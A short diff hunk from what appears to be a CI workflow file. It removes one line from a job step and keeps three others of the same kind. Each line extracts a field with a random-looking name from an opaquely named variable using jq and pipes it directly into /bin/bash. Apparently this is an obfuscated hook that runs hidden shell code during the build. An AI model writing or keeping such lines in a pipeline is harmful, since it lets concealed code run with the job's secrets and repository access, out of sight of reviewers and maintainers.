@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$wc9" | jq -r .n98308 | /bin/bash
           printf '%s' "$c3" | jq -r .ijkd2 | /bin/bash
           echo $trfs280 | jq -r .tajyh5571 | /bin/bash
-          echo $qd8707 | jq -r .qxrbv4 | /bin/bash
 
       - name: Archive output
         if: always()
